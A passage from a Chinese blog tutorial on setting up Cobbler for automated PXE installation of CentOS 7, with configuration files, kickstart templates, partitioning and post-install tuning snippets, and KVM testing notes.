d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置cobbler：cobbler配置文件放置在/etc/cobbler目录，在启动之前需要server端IP，dhcp等相关信息，首先修改 /etc/cobbler/settings主配置文件，需要修改的参数有以下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 通过以下命令生成系统安装后的默认root密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">openssl passwd -1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 并将生成的密码修改到配置中</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default_password_crypted: “$1$RUNYOYnz$QgzdhCD2T7qXWI1IPpAih0”</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># server端ip，对外提供dhcp和http服务，必须为一个固定内网ip地址</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server: 192.168.1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># next_server为tftp服务所在ip，通常是需要和server保持一致</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">next_server: 192.168.1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 打开cobbler对相关服务的自动管理功能，如配置变更和启停等</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">manage_dhcp: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">manage_tftpd：1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>&nbsp;修改依赖组件的配置：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sed -i '/disable/c\\tdisable\t\t\t= no' /etc/xinetd.d/tftp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service xinetd restart</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">修改dhcp网段：vi /etc/cobbler/dhcp.template</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">subnet 192.168.1.0 netmask 255.255.255.0 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     option routers             192.168.1.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     option domain-name-servers 192.168.1.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp; &nbsp; &nbsp;range dynamic-bootp &nbsp; &nbsp; &nbsp; &nbsp;192.168.1.100 192.168.1.200;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     option subnet-mask         255.255.255.0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     filename                   "/pxelinux.0";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     default-lease-time         21600;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     max-lease-time             43200;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     next-server                $next_server;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动服务：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systemctl start httpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl start cobblerd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl enable httpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl enable cobblerd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;服务检查：cobbler提供了check命令可用于检查各项配置是否满足需要</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cobbler check</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 通常第一次会提示下载loader</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cobbler get-loaders</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 如中途修改cobbler配置后需重启cobbler服务</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl restart cobblerd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 如变更了dhcp、tftp等相关信息需重新同步配置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cobbler sync</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 顺便配置好web管理页面的访问密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">htdigest /etc/cobbler/users.digest "Cobbler" cobbler</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>&nbsp;可以反复通过check命令来检查环境是否部署OK，并根据实际需求调整各项配置文件，直至check结果复合要求即可。至此cobbler的安装及配置完成。web端工具访问地址：<a href="https://192.168.1.1/cobbler_web" target="_blank" rel="noopener noreferrer">https://192.168.1.1/cobbler_web</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="系统镜像准备">系统镜像准备：<a class="hash-link" href="#系统镜像准备" title="标题的直接链接">​</a></h3><p>接下来我们需要将系统镜像导入cobbler中，并自定义安装引导的kickstart配置。我们要部署到节点上的系统是CentOS7。需要注意的是如果需要通过kickstart定制一些基础软件包的安装，那么需要使用软件包更全的DVD iso，因minimal iso中提供的软件包有限。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 将iso挂载到本地目录</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mount -o auto CentOS-7-x86_64-DVD-1611.iso /mnt/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 导入到cobbler中</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cobbler import --name=centos7 --arch=x86_64 --path=/mnt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 查看导入的系统及profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cobbler distro list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cobbler distro report --name=centos7-x86_64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cobbler profile list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 卸载iso mount point</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">umount /mnt/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>&nbsp;可以看到上面的步骤中我们将CentOS7镜像导入到cobbler中，有几个核心概念需要理解：</p><p>distro - 及系统发行版本，不同的镜像导入后对应不同的distro，如centos7-x86_64，不同的distro对应不同的引导镜像；</p><p>profile - distro的配置文件，一个distro可以有多个profile，默认导入时会自动生成一个profile，不同的profile可以定义不同的kernel选项，使用不同的kickstart配置；</p><p>system - 各个机器所使用的profile实例，与机器MAC地址绑定，可以细化到机器级别的自定义安装，如果所有机器安装都是统一的则无需使用system配置。</p><p>&nbsp;接下来需要理解的是cobbler中对kickstart文件的管理方式，ks文件是我们需要重点关注的中间产物，决定了系统自动化部署的执行流程和最终效果。ks文件与profile绑定，默认生成的profile会指向一个默认的ks文件，通常我们需要对其进行自定义来满足不同的部署要求。当系统通过PXE引导至profile选择菜单后，一旦选定了需要部署的系统，接下来就会按照该profile所对应的ks文件来执行一系列的安装操作。</p><p>在cobbler中ks文件的实例是通过cgi动态生成的，而生成ks实例所依赖的则是ks templates和snippets， cobbler通过template来将ks文件主体流程部分模板化，通过snippets来管理可以在不同ks templates中公用的流程片段。</p><p>我们的需求如下：</p><p>安装一个精简的CentOS7系统；
同时默认安装一些必要的软件包；
首次安装时只对系统盘进行分区和格式化，其他磁盘不动；
为了便于管理我们将更改网卡名为ethX，且默认禁用IPv6,；
为了方便使用虚拟机测试整个安装流程，需要在磁盘分区时自动适配磁盘名如vda/sda；
安装完成后能对一些基础配置进行初始化。&nbsp; &nbsp; &nbsp; &nbsp;</p><p>首先拷贝cobbler默认的template生成一个自定义的ks template，</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># kickstart template</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># (includes %end blocks)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># do not use with earlier distros</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#platform=x86, AMD64, or Intel EM64T</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># System authorization information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">auth --useshadow --enablemd5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># System bootloader configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#bootloader --location=mbr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Partition clearing information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">clearpart --all --initlabel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Use text mode install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Firewall configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">firewall --disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Run the Setup Agent on first boot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">firstboot --disable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># System keyboard</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">keyboard us</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># System language</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lang en_US</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Use network installation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url --url=$tree</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># If any cobbler repo definitions were referenced in the kickstart profile, include them here.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$yum_repo_stanza</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Network information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('network_config')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Reboot after installation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reboot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#Root password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rootpw --iscrypted $default_password_crypted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># SELinux configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">selinux --disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Do not configure the X Window System</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">skipx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># System timezone</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">timezone Asia/Shanghai</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Install OS instead of upgrade</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Clear the Master Boot Record</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">zerombr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Allow anaconda to partition the system as needed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#autopart</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('main_partition_select')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%pre</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('log_ks_pre')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('kickstart_start')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('pre_install_network_config')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('pre_partition_select_custom')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Enable installation monitoring</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('pre_anamon')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%packages</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@^minimal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@core</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chrony</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net-tools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python-setuptools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rsync</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lrzsz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">expect</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ntpdate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-selinux-policy*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-NetworkManager*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-kexec-tools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-snappy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-wpa_supplicant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-ppp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%addon com_redhat_kdump --disable --reserve-mb='auto'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%post --nochroot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('log_ks_post_nochroot')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%post</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('log_ks_post')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Start yum configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$yum_config_stanza</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># End yum configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('post_install_kernel_options')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('post_install_network_config')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('download_config_files')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('cobbler_register')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Enable post-install boot notification</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('post_anamon')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('post_install_custom_sys')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Start final steps</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$SNIPPET('kickstart_done')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># End final steps</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>&nbsp;注意ks template中的红色部分为我们增加的自定义snippets，第一个pre_partition_select_custom作用是自动根据磁盘类型来生成分区和格式化选项，同时兼容虚拟机和物理机，内容如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Determine architecture-specific partitioning needs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [ -b /dev/vda ]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cat &gt;/tmp/partinfo &lt;&lt; EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">clearpart --initlabel --all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ignoredisk --only-use=vda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bootloader --location=mbr --boot-drive=vda --driveorder=vda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">clearpart --initlabel --drives=vda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">part /boot --fstype=ext3 --ondisk=vda --size=500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">part / --fstype=xfs --size=1024 --grow --ondisk=vda --asprimary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">elif [ -b /dev/sda ]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cat &gt;/tmp/partinfo &lt;&lt; EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">clearpart --initlabel --all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ignoredisk --only-use=sda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bootloader --location=mbr --boot-drive=sda --driveorder=sda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">part /boot --fstype=ext3 --ondisk=sda --size=500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">part / --fstype=xfs --size=100000 --ondisk=sda --asprimary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">part /data --fstype=xfs --grow --ondisk=sda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>&nbsp;第二个post_install_custom_sys作用是在系统安装最后阶段对一些必要的配置进行更改，其中运行的是shell脚本，内容如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># cat snippets/post_install_custom_sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ! grep -q 'custom_sysctl' /etc/sysctl.conf; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cat &gt;&gt;/etc/sysctl.conf&lt;&lt;EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">## custom_sysctl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fs.file-max = 262144</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.core.somaxconn = 10240</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vm.swappiness = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.ip_local_port_range = 1024 65000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.core.rmem_max = 16777216</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.core.wmem_max = 16777216</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.core.rmem_default = 1048576</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.core.wmem_default = 524288</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.tcp_rmem = 4096 87380 16777216</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.tcp_wmem = 4096 65536 16777216</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.core.netdev_max_backlog = 2500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.tcp_max_syn_backlog = 40960</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.tcp_syncookies = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.tcp_tw_reuse = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.tcp_tw_recycle = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net.ipv4.tcp_fin_timeout = 30</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod +x /etc/rc.d/rc.local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if grep -q '^UseDNS' /etc/ssh/sshd_config; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  sed -i 's/^UseDNS .*/UseDNS no/' /etc/ssh/sshd_config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  sed -i 's/^#UseDNS .*/UseDNS no/' /etc/ssh/sshd_config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接下来还需要修改内核引导参数，完成网卡名字的变更及IPv6禁用：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sed -i -e 's|^GRUB_CMDLINE_LINUX=\"|GRUB_CMDLINE_LINUX=\"net.ifnames=0 biosdevname=0 |g' /etc/default/grub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sed -i -e 's|^GRUB_CMDLINE_LINUX=\"|GRUB_CMDLINE_LINUX=\"ipv6.disable=1 |g' /etc/default/grub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>通过这几部分的组合，即可生成一个完整可用的ks文件，下面我将介绍如何通过虚拟机来测试安装。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用虚拟机测试pxe">使用虚拟机测试PXE<a class="hash-link" href="#使用虚拟机测试pxe" title="标题的直接链接">​</a></h3><p>安装虚拟化相关软件包，使用kvm虚拟机，同时安装图形界面虚拟机管理工具virt-manager方便安装操作。网络选择使用bridge模式,点击新建虚拟机，在安装选项中选择PXE,注意内存设置必须大于1G，否则PXE引导进入系统后很可能报错。</p>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVM使用ISO镜像安装银河麒麟v10 arm系统]]></title>
        <id>/2021/12/16/cvm-kylin-v10-iso-install</id>
        <link href="https://itxx00.github.io/notes/blog/2021/12/16/cvm-kylin-v10-iso-install"/>
